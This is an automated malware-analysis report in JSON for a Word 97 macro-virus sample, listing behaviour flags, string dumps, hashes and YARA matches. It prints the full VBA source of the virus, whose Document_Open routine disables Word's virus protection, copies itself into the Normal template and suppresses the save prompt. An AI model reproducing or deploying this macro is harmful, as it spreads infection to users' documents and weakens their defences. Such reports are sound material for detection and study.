{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "AddFromString": "May attempt to modify the VBA code",
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "CodeModule": "May attempt to modify the VBA code",
            "Document_New": "Runs when a new Word document is created",
            "Document_Open": "Runs when the Word or Publisher document is opened",
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "VBA Stomping": "VBA Stomping was detected: the VBA source code and P-code are different, this may have been used to hide malicious code",
            "VBComponents": "May attempt to modify the VBA code",
            "VBProject": "May attempt to modify the VBA code"
        },
        "macro": "Private Sub Document_New()\n\nEnd Sub\n\nPrivate Sub Document_Open()\n    Dim code As String\n    If Left$(NormalTemplate.Name, 8) <> \"Document\" Then\n        Options.VirusProtection = False\n        With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule\n            code = .Lines(1, .CountOfLines)\n            ReplaceTemplate code, \"Normal\", \"Template\", \"Happy\", \"Panther\"\n            ReplaceTemplate code, \"Active\", \"Document\", \"Normal\", \"Template\"\n            ReplaceTemplate code, \"Happy\", \"Panther\", \"Active\", \"Document\"\n            With NormalTemplate.VBProject.VBComponents.Item(1).CodeModule\n                .DeleteLines 1, .CountOfLines\n                .AddFromString code\n            End With\n        End With\n        Options.SaveNormalPrompt = False\n       End If\nEnd Sub\nPrivate Sub ReplaceTemplate(target As String, prepre As String, prepost As String, postpre As String, postpost As String)\n    Dim index As Long, pre As String, post As String, preLen As Long\n    \n    pre = prepre + prepost\n    post = postpre + postpost\n    \n    index = 1\n    preLen = Len(pre)\n    \n    While InStr(index, target, pre) <> 0\n        index = InStr(index, target, pre)\n        target = Left(target, index - 1) + post + Mid$(target, index + preLen)\n        index = index + 1\n    Wend\nEnd Sub\n\n' Processing file: VirusShare_35055292581c327ff572b76d0f60c4ba\n' ===============================================================================\n' Module streams:\n' Macros/VBA/ThisDocument - 3047 bytes\n' Line #0:\n' \tFuncDefn (Private Sub Document_New())\n' Line #1:\n' Line #2:\n' \tEndSub \n' Line #3:\n' Line #4:\n' \tFuncDefn (Private Sub Document_Open())\n' Line #5:\n' \tDim \n' \tVarDefn code (As String)\n' Line #6:\n' \tLd NormalTemplate \n' \tMemLd New \n' \tLitDI2 0x0008 \n' \tArgsLd LBound$ 0x0002 \n' \tLitStr 0x0008 \"Document\"\n' \tNe \n' \tIfBlock \n' Line #7:\n' \tLitVarSpecial (False)\n' \tLd Options \n' \tMemSt VirusProtection \n' Line #8:\n' \tStartWithExpr \n' \tLitDI2 0x0001 \n' \tLd ActiveDocument \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tArgsMemLd Item 0x0001 \n' \tMemLd CodeModule \n' \tWith \n' Line #9:\n' \tLitDI2 0x0001 \n' \tMemLdWith CountOfLines \n' \tArgsMemLdWith Lines 0x0002 \n' \tSt code \n' Line #10:\n' \tLd code \n' \tLitStr 0x0006 \"Normal\"\n' \tLitStr 0x0008 \"Template\"\n' \tLitStr 0x0005 \"Happy\"\n' \tLitStr 0x0007 \"Panther\"\n' \tArgsCall ReplaceTemplate 0x0005 \n' Line #11:\n' \tLd code \n' \tLitStr 0x0006 \"Active\"\n' \tLitStr 0x0008 \"Document\"\n' \tLitStr 0x0006 \"Normal\"\n' \tLitStr 0x0008 \"Template\"\n' \tArgsCall ReplaceTemplate 0x0005 \n' Line #12:\n' \tLd code \n' \tLitStr 0x0005 \"Happy\"\n' \tLitStr 0x0007 \"Panther\"\n' \tLitStr 0x0006 \"Active\"\n' \tLitStr 0x0008 \"Document\"\n' \tArgsCall ReplaceTemplate 0x0005 \n' Line #13:\n' \tStartWithExpr \n' \tLitDI2 0x0001 \n' \tLd NormalTemplate \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tArgsMemLd Item 0x0001 \n' \tMemLd CodeModule \n' \tWith \n' Line #14:\n' \tLitDI2 0x0001 \n' \tMemLdWith CountOfLines \n' \tArgsMemCallWith DeleteLines 0x0002 \n' Line #15:\n' \tLd code \n' \tArgsMemCallWith AddFromString 0x0001 \n' Line #16:\n' \tEndWith \n' Line #17:\n' \tEndWith \n' Line #18:\n' \tLitVarSpecial (False)\n' \tLd Options \n' \tMemSt SaveNormalPrompt \n' Line #19:\n' \tEndIfBlock \n' Line #20:\n' \tEndSub \n' Line #21:\n' \tFuncDefn (Private Sub ReplaceTemplate(target As String, prepre As String, prepost As String, postpre As String, postpost As String))\n' Line #22:\n' \tDim \n' \tVarDefn index (As Long)\n' \tVarDefn pre (As String)\n' \tVarDefn post (As String)\n' \tVarDefn preLen (As Long)\n' Line #23:\n' Line #24:\n' \tLd prepre \n' \tLd prepost \n' \tAdd \n' \tSt pre \n' Line #25:\n' \tLd postpre \n' \tLd postpost \n' \tAdd \n' \tSt post \n' Line #26:\n' Line #27:\n' \tLitDI2 0x0001 \n' \tSt index \n' Line #28:\n' \tLd pre \n' \tFnLen \n' \tSt preLen \n' Line #29:\n' Line #30:\n' \tLd index \n' \tLd target \n' \tLd pre \n' \tFnInStr3 \n' \tLitDI2 0x0000 \n' \tNe \n' \tWhile \n' Line #31:\n' \tLd index \n' \tLd target \n' \tLd pre \n' \tFnInStr3 \n' \tSt index \n' Line #32:\n' \tLd target \n' \tLd index \n' \tLitDI2 0x0001 \n' \tSub \n' \tArgsLd LBound 0x0002 \n' \tLd post \n' \tAdd \n' \tLd target \n' \tLd index \n' \tLd preLen \n' \tAdd \n' \tArgsLd Mid$$ 0x0002 \n' \tAdd \n' \tSt target \n' Line #33:\n' \tLd index \n' \tLitDI2 0x0001 \n' \tAdd \n' \tSt index \n' Line #34:\n' \tWend \n' Line #35:\n' \tEndSub \n"
    },
    "filename": "VirusShare_35055292581c327ff572b76d0f60c4ba",
    "filesize": 27648,
    "filetype": "Composite Document File V2 Document, Little Endian, Os: Windows, Version 4.10, Code page: 1251, Title: This is goat file, Author: Vasya Pupkin, Template: Normal.dot, Last Saved By: Vasya Pupkin, Revision Number: 2, Name of Creating Application: Microsoft Word 8.0, Total Editing Time: 01:00, Create Time/Date: Fri Jan 26 10:07:00 2001, Last Saved Time/Date: Fri Jan 26 10:21:00 2001, Number of Pages: 1, Number of Words: 12, Number of Characters: 74, Security: 0",
    "hashes": {
        "md5": "35055292581c327ff572b76d0f60c4ba",
        "sha1": "d3cd13bff712b38f0590fa1c0ad42e18abc842fe",
        "sha256": "c6ed865de6180ad8282fdbc1edc08febcc136fa188e9de2e101e90ea83fe6e05"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "bjbj\u064e",
            "This is goat file",
            "This is goat file",
            "This is goat file",
            "This is goat file",
            "This is goat file",
            "$PEZiAL_BAiT_F0R_-_ByteSurgeon@seznam.cz_-_05.12.2001",
            "69BC8C73,41.254 VS046693.DOC",
            "/ =!",
            "GQUQ",
            "This is goat file",
            "Vasya Pupkin",
            "Normal.dot",
            "Vasya Pupkin",
            "Microsoft Word 8.0",
            "Zoopark",
            "This is goat file",
            "Title",
            "_PID_GUID",
            "Te`H",
            "Pant`J",
            "Acti`L",
            "rmal`N",
            "Document",
            "Normal",
            "Template",
            "Happy",
            "Panther",
            "Active",
            "Document",
            "Normal",
            "TemplateA@6",
            "Happy",
            "Panther",
            "Active",
            "DocumentA@6",
            "Attribut",
            "e VB_Nam",
            "e = \"Thi",
            "sDocumen",
            "1Normal",
            "VCreata",
            "`False",
            "Predecl",
            "xTru",
            "\"Expose",
            "Template Deriv",
            "$Customiz",
            "8 Sub ",
            "t_New()",
            "Open",
            "Dim code  As Sng",
            "If Left$(",
            ", 8) <> \"",
            " Then",
            "Options",
            ".VirusProtec",
            "With A",
            "Dve%.VB",
            "Compon",
            "s.Item(",
            "1).C",
            "VMod<ul",
            ".Lines(1",
            "untOf'",
            "^ceE5B@, \":\"@",
            "Happy",
            "Panther",
            "BWotW&.DeleteS",
            "AddFromCX",
            "ESaveC21",
            "mptA",
            "h_)_*(targ",
            "etG^, pre@",
            "$Mjindex!",
            "Longb",
            "r= |n(",
            "In6(",
            ", %\"",
            "ftD0",
            "- 1) c",
            "Mid$",
            "Wend@",
            "33a714f98",
            "WordS10",
            "VBA0",
            "Win16",
            "Win32",
            "Mac0",
            "Doc1_0",
            "stdole`0",
            "MSFormsC",
            "ThisDocument<0",
            "_Evaluate",
            "Normal0",
            "Office",
            "Project-0",
            "Documentj0",
            "Document_New<E0",
            "Document_Open0",
            "code0",
            "NormalTemplateq0",
            "Options0",
            "VirusProtectionoD0",
            "ActiveDocument\\0",
            "VBProjectOh0",
            "VBComponents",
            "Itemz0",
            "CodeModule",
            "Lines0",
            "CountOfLines!\\0",
            "ReplaceTemplate0",
            "DeleteLines",
            "AddFromString0",
            "SaveNormalPrompt\u02bc0",
            "targetF0",
            "prepre0",
            "prepost0",
            "postpre\u06f60",
            "postpost+0",
            "index0",
            "pre50",
            "post0",
            "preLenn0",
            "Project",
            "rstd",
            "ole>",
            "\\G{00020430-",
            "0046}#",
            "2.0#0#C:",
            "\\WIN98\\S@YSTEM\\",
            ".tlb#OLE",
            " AutomatHion",
            "SForms>",
            "E46F5",
            "DE1-F38E",
            "-11D4-85",
            "EE84DF",
            "2.TW",
            "D#MicrosPoft ",
            " Libr8ary",
            "O4*OI@P\\VBE\\",
            "X'(.E",
            "vN@Tal",
            "vNSa@w",
            " @+\tB,C",
            "eOffic",
            "fA=2DF",
            "8D04C-5B",
            "FA-101B-BDE5",
            "eMICR",
            "OSOFT OF FICE\\",
            "MSO97.DLLHg",
            "  8.0g",
            "ThisDocu ment",
            "i\"D@Fc",
            "ThisDocument",
            "ID=\"{18025A71-F38E-11D4-852D-0000E84DFF88}\"",
            "Document=ThisDocument/&H00000000",
            "Name=\"Project\"",
            "HelpContextID=\"0\"",
            "CMG=\"6062D91FDD1FDD1FDD1FDD\"",
            "DPB=\"1210AB7B5C7C5C7C5C\"",
            "GC=\"C4C67DCD9D7E9E7E9E81\"",
            "[Host Extender Info]",
            "&H00000001={3832D640-CF90-11CF-8E43-00A0C911005A};VBE;&H00000000",
            "[Workspace]",
            "ThisDocument=0, 0, 0, 0, C",
            "Microsoft Word Document",
            "MSWordDoc",
            "Word.Document.8"
        ],
        "file": {
            "69BC8C73,41.254 VS046693.DOC": "Word"
        },
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.297911",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": [
        {
            "maldoc_somerules.yar": "office_document_vba"
        },
        {
            "Maldoc_VBA_macro_code.yar": "Contains_VBA_macro_code"
        }
    ]
}
